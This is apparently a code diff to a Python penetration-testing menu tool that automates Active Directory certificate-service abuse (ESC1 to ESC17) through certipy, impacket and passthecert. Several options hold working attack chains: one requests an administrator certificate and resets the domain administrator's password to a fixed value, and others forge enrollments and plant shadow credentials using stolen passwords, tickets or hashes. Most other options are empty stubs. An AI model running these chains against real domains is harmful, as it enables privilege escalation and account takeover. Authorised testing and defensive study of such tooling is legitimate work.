@@ -5078,42 +5078,40 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='701':
+      print("EXPLOIT NEEDS UPDATING")
       print("[!] ESC01 - Enrollable by Low-Privileged Users: Templates allow anyone to request certs with Client Authentication EKU and SAN UPN...\n")      
-      checkParams = test_TIP()
-      if checkParams != 1:
-         checkParams = test_DOM()      
-      if checkParams != 1:      
-         print(colored("[*] Checking privilges...", colour3))
-         SKEW = timeSync(SKEW)
-         remoteCOM("nxc winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
-         catsFile("priv.tmp")
-         with open("priv.tmp") as file:
-            contents = file.read()
-            if "SeMachineAccountPrivilege" in contents:
-               print(colored("[*] Creating new Domain Computer...", colour3))
-               localCOM(keyPath + "addcomputer.py -computer-name shtnx_pc -computer-pass 1234 " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " > out.tmp")
-               catsFile("out.tmp")
-               with open("out.tmp") as file:
-                  contents = file.read()
-                  if "[-] Relayed user machine quota exceeded!" in contents:
-#                    Exploit one failed - trying exploit two...
-                     group = input("\n[?] Please enter template name to assign: ")
-                     base = DOM.split(".", 1)[0]
-                     localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -upn administrator@" + DOM.rstrip(" ") + " -target " + DOM.rstrip(" ") + " -ca " + base + "-dc-ca -template " +  group + " > out.tmp")
-                     catsFile("out.tmp")
-                     localCOM("certipy auth -pfx administrator.pfx -dc-ip " + TIP.rstrip(" ") + " > out.tmp")
-                     catsFile("out.tmp")
-                  else:
-                     print(colored("[*] Enrolling into the vulnerable template, and supplying a SAN...", colour3)) 
-                     group = input("\n[?] Please enter template name to assign: ")
-                     localCOM("certipy req -username 'shtnx_pc$' -p 1234 -dc-ip " + TIP.rstrip(" ") + " -ca AUTHORITY-CA -upn administrator@" + DOM.rstrip(" ") + " -template " + group)               
-                     localCOM("certipy cert -pfx administrator.pfx -nokey -out user.crt")
-                     localCOM("certipy cert -pfx administrator.pfx -nocert -out user.key")
-                     localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action whoami")
-                     localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action modify_user -target administrator -new-pass H@ck3r!!!")
-            else:
-               print("[-] SeMachineAccountPrivilege is not enabled...")
-      prompt() 
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking enable by low-privileged user...", colour3)) 
+      print(colored("[*] Checking privilges...", colour3))
+      SKEW = timeSync(SKEW)                       
+      remoteCOM("nxc winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
+      catsFile("priv.tmp")
+      with open("priv.tmp") as file:
+         contents = file.read()
+         if "SeMachineAccountPrivilege" in contents:
+            print(colored("[*] Creating new Domain Computer...", colour3))
+            localCOM(keyPath + "addcomputer.py -computer-name shtnx_pc -computer-pass 1234 " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " > out.tmp")
+            catsFile("out.tmp")
+            with open("out.tmp") as file:
+               contents = file.read()
+               if "[-] Relayed user machine quota exceeded!" in contents:
+                  group = input("\n[?] Please enter template name to assign: ")
+                  base = DOM.split(".", 1)[0]
+                  localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -upn administrator@" + DOM.rstrip(" ") + " -target " + DOM.rstrip(" ") + " -ca " + base + "-dc-ca -template " +  group + " > out.tmp")
+                  catsFile("out.tmp")
+                  localCOM("certipy auth -pfx administrator.pfx -dc-ip " + TIP.rstrip(" ") + " > out.tmp")
+                  catsFile("out.tmp")
+               else:
+                  print(colored("[*] Enrolling into the vulnerable template, and supplying a SAN...", colour3)) 
+                  group = input("\n[?] Please enter template name to assign: ")
+                  localCOM("certipy req -username 'shtnx_pc$' -p 1234 -dc-ip " + TIP.rstrip(" ") + " -ca AUTHORITY-CA -upn administrator@" + DOM.rstrip(" ") + " -template " + group)               
+                  localCOM("certipy cert -pfx administrator.pfx -nokey -out user.crt")
+                  localCOM("certipy cert -pfx administrator.pfx -nocert -out user.key")
+                  localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action whoami")
+                  localCOM(keyPath + "passthecert.py -crt user.crt -key user.key -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -action modify_user -target administrator -new-pass H@ck3r!!!")
+         else:
+            print("[-] SeMachineAccountPrivilege is not enabled...")
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5125,8 +5123,28 @@ while True:
 
    if selection =='702':
       print("[!] ESC02 - No Manager Approval Enforcement: Templates require manager approval, but it's not enforced...\n") 
-      SKEW = timeSync(SKEW)
-      prompt() 
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking no manger approval enforecment...", colour3))      
+      SKEW = timeSync(SKEW)    
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()   
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5137,9 +5155,30 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='703':
+      print("EXPLOIT NEEDS UPDATING")
       print("[!] ESC03 - Subject Name Supply: Templates allow users to specify the certificate’s Subject Name — impersonation risk...\n")
-      SKEW = timeSync(SKEW) 
-      prompt() 
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking subject name supply..", colour3))       
+      SKEW = timeSync(SKEW)   
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()   
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5151,8 +5190,28 @@ while True:
 
    if selection =='704':
       print("[!] ESC04 - Dangerous EKUs: Templates include Any Purpose EKU, allowing logon certs from unintended templates...\n") 
-      SKEW = timeSync(SKEW)
-      prompt() 
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking dangerous EKUs...", colour3))   
+      SKEW = timeSync(SKEW)       
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()   
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5164,8 +5223,28 @@ while True:
 
    if selection =='705':
       print("[!] ESC05 - Misconfigured CA ACLs: Weak CA permissions allow attackers to issue or manage templates...\n") 
-      SKEW = timeSync(SKEW)
-      prompt() 
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking misconfigured CA ACLS...", colour3))      
+      SKEW = timeSync(SKEW)    
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()   
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5177,18 +5256,39 @@ while True:
 
    if selection =='706':
       print("[!] ESC6 - Subordinate CA Abuse: Misconfigurations allow attackers to issue their own certificates as a rogue CA...\n") 
-      SKEW = timeSync(SKEW)
-      prompt()          
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking misconfigured CA ACLS...", colour3))    
+      SKEW = timeSync(SKEW)      
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()           
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Certipy ESC07
+# Details : Menu option selected - Certipy ESC07 - HERE TO UPDATW¬¬
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='707':
+      print("EXPLOIT NEEDS UPDATEING")
       print("[!] ESC07 Enrollment Agent Abuse: If you can request Enrollment Agent certs, you can enroll on behalf of others.\n")
       checkParams = test_TIP()
       if checkParams != 1:
@@ -5233,9 +5333,29 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='708':
-      print("[!] ESC08 - No Security Descriptor: Template has no permissions set — anyone can request certificates...\n") 
-      SKEW = timeSync(SKEW)
-      prompt()      
+      print("[!] ESC08 - No Security Descriptor: Template has no permissions set — anyone can request certificates...\n")
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking no security descriptor...", colour3))     
+      SKEW = timeSync(SKEW)     
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()        
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5247,8 +5367,28 @@ while True:
 
    if selection =='709':
       print("[!] ESC09 - NTAuth Store Injection: Adding rogue CAs to the NTAuth store allows unauthorized cert validation...\n") 
-      SKEW = timeSync(SKEW)
-      prompt() 
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking NTAuth store injection...", colour3))   
+      SKEW = timeSync(SKEW)           
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()   
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5260,8 +5400,28 @@ while True:
 
    if selection =='710':
       print("[!] ESC10 - Unverified SANs at CA Level: CA does not verify SANs, allowing forged identities at issuance...\n")
-      SKEW = timeSync(SKEW) 
-      prompt()    
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking unverified SANS at CA level...", colour3))   
+      SKEW = timeSync(SKEW)       
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()              
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5273,8 +5433,28 @@ while True:
 
    if selection =='711':
       print("[!] ESC11 - Certificate Renewal Exploit: Allows certificate renewal with modified contents (e.g., new UPN) — impersonation...\n") 
-      SKEW = timeSync(SKEW)
-      prompt()       
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking certificate renewal exploit...", colour3))   
+      SKEW = timeSync(SKEW)   
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()           
                             
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5286,8 +5466,28 @@ while True:
 
    if selection =='712':
       print("[!] ESC12 - Vulnerable Cross-Forest Trust: Abuse of certificate-based trust between forests to escalate...\n") 
-      SKEW = timeSync(SKEW)
-      prompt()
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking vulnerable cross-forest trust...", colour3)) 
+      SKEW = timeSync(SKEW)       
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()     
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5298,13 +5498,36 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='713':
-      print("[!] ESC13 - NDES Misconfiguration: Abusing the Network Device Enrollment Service to request certs via MSCEP with spoofed identities...") 
+      print("[!] ESC13 - NDES Misconfiguration: Abusing the Network Device Enrollment Service to request certs via MSCEP with spoofed identities...")
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
       getCert1 = input("[?] Please enter target certificate name: ")
+      print(colored("[*] Checking NDES micconfiguration...", colour3)) 
       SKEW = timeSync(SKEW)
-      localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -target " + SDM.rstrip(" ") + " -dc-host " + SDM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -ca " + getCert1.rstrip(" ") + " -template TemporaryWinRM")
-      print(colored("\n[*] Fake enrolment created...", colour3))
-      localCOM("certipy auth -pfx " + USR.rstrip(" ") + ".pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username " + USR.rstrip() + " ")
-      prompt()
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k " + TGT.rstrip(" ") + " -target " + SDM.rstrip(" ") + " -dc-host " + SDM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -ca " + getCert1.rstrip(" ") + " -template TemporaryWinRM")
+            print(colored("\n[*] Fake enrolment created...", colour3))
+            localCOM("certipy auth -pfx " + USR.rstrip(" ") + ".pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username " + USR.rstrip() + " ")
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -target " + SDM.rstrip(" ") + " -dc-host " + SDM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -ca " + getCert1.rstrip(" ") + " -template TemporaryWinRM")
+            print(colored("\n[*] Fake enrolment created...", colour3))
+            localCOM("certipy auth -pfx " + USR.rstrip(" ") + ".pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username " + USR.rstrip() + " ")
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " -target " + SDM.rstrip(" ") + " -dc-host " + SDM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -ca " + getCert1.rstrip(" ") + " -template TemporaryWinRM")
+            print(colored("\n[*] Fake enrolment created...", colour3))
+            localCOM("certipy auth -pfx " + USR.rstrip(" ") + ".pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username " + USR.rstrip() + " ")
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()     
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5316,8 +5539,28 @@ while True:
 
    if selection =='714':
       print("[!] ESC14 - Weak Template Duplication Rights: If users can duplicate vulnerable templates and enroll, they can bypass restrictions...\n") 
-      SKEW = timeSync(SKEW)
-      prompt()
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking weak template duplication...", colour3))
+      SKEW = timeSync(SKEW)       
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()     
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5329,8 +5572,28 @@ while True:
 
    if selection =='715':
       print("[!] ESC15 - Certificate Authority Spoofing: Weaknesses in how systems validate certificates issued by rogue/malicious CAs...\n") 
-      SKEW = timeSync(SKEW)
-      prompt()      
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking certificate authroity spoofing...", colour3))
+      SKEW = timeSync(SKEW)       
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
+      prompt()          
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -5342,17 +5605,28 @@ while True:
 
    if selection =='716':
       print("[!] ESC16 - Shadow Credentials Abuse: Abusing msDS-KeyCredentialLink to add rogue cert login methods (e.g., using certipy shadow)...\n") 
-      checkParams = test_TIP()
-      if checkParams != 1:
-         checkParams = test_DOM()      
-      if checkParams != 1:
-         AD1 = input("[?] Please enter shadow user name: ")
-         print(colored("[*] Creating shadow credentials...", colour3)) 
-         SKEW = timeSync(SKEW)        
-         if PAS[:2] != "''":        
-             localCOM("certipy shadow auto -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -account " +  AD1 + " -dc-ip " + TIP.rstrip(" "))
-         else:
+      AD1 = input("[?] Please enter shadow user name: ")
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking shadow credentials abuse...", colour3))
+      SKEW = timeSync(SKEW)        
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")  
+            localCOM("certipy shadow auto -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k " + TGT.rstrip(" ") + " -account " +  AD1 + " -dc-ip " + TIP.rstrip(" "))
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")  
+            localCOM("certipy shadow auto -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -account " +  AD1 + " -dc-ip " + TIP.rstrip(" "))
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+             print("[i] Using hash as credential...")  
              localCOM("certipy shadow auto -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " -account " + AD1 + " -dc-ip " + TIP.rstrip(" "))         
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")            
       prompt()   
       
 # ------------------------------------------------------------------------------------- 
@@ -5364,8 +5638,28 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='717':
-      print("[!] ESC17 - Orphaned Enrollment Agent Templates: Enrollment Agent templates still usable even if removed from CA config — persistence risk...\n") 
-      SKEW = timeSync(SKEW)
+      print("[!] ESC17 - Orphaned Enrollment Agent Templates: Enrollment Agent templates still usable even if removed from CA config — persistence risk...\n")
+      methodSelect = input("[?] Select method [1] ticket [2] password, or [3] hash value: ")
+      print(colored("[*] Checking orphaned enrollment agent templates...", colour3))
+      SKEW = timeSync(SKEW)       
+      if methodSelect[:1]=="1":
+         try:
+            print("[i] Using ticket as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using ticket...")
+      if methodSelect[:1]=="2":
+         try:
+            print("[i] Using password as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using password...")
+      if methodSelect[:1]=="3":
+         try:
+            print("[i] Using hash as credential...")      
+            pass
+         except:
+            print(f"[-] Failed to check misconfigurations using hash...")
       prompt()     
 
 # ------------------------------------------------------------------------------------- 
